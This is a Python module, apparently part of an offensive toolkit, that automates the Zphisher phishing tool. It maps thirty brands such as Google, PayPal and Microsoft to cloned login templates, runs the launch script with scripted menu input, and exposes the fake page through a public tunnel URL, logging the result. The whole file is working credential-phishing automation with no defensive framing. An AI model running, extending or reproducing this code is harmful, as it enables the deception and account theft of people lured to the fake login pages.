import subprocess
import os
from pathlib import Path
from ..utils import load_config, save_result, timestamp
from ..tunnel.manager import get_public_url

cfg = load_config()
ZPHISHER_DIR = cfg["tool_paths"]["zphisher"]

TEMPLATES = {
    "facebook": "1", "instagram": "2", "google": "3", "microsoft": "4",
    "netflix": "5", "paypal": "6", "steam": "7", "twitter": "8",
    "playstation": "9", "tiktok": "10", "twitch": "11", "pinterest": "12",
    "snapchat": "13", "linkedin": "14", "ebay": "15", "quora": "16",
    "protonmail": "17", "spotify": "18", "reddit": "19", "adobe": "20",
    "deviantart": "21", "badoo": "22", "origin": "23", "dropbox": "24",
    "yahoo": "25", "wordpress": "26", "yandex": "27", "stackoverflow": "28",
    "vk": "29", "xbox": "30",
}

AVAILABLE_TEMPLATES = list(TEMPLATES.keys())


def run(template: str = "google", dry_run: bool = False) -> dict:
    choice = TEMPLATES.get(template.lower(), "3")
    script = str(Path(ZPHISHER_DIR) / "scripts" / "launch.sh")

    if dry_run:
        data = {
            "module": "phishing.page",
            "template": template,
            "choice": choice,
            "dry_run": True,
            "timestamp": timestamp(),
            "status": "dry_run_ok",
            "script": script,
            "available_templates": AVAILABLE_TEMPLATES,
        }
        save_result("phishing_page", data)
        return data

    env = os.environ.copy()
    proc = subprocess.Popen(
        ["bash", script],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=ZPHISHER_DIR,
        env=env,
    )
    try:
        stdout, stderr = proc.communicate(input=f"{choice}\n1\n\n", timeout=30)
    except subprocess.TimeoutExpired:
        stdout, stderr = "", ""

    public_url = get_public_url()
    data = {
        "module": "phishing.page",
        "template": template,
        "timestamp": timestamp(),
        "public_url": public_url,
        "pid": proc.pid,
        "output_excerpt": stdout[:500],
    }
    save_result("phishing_page", data)
    return data
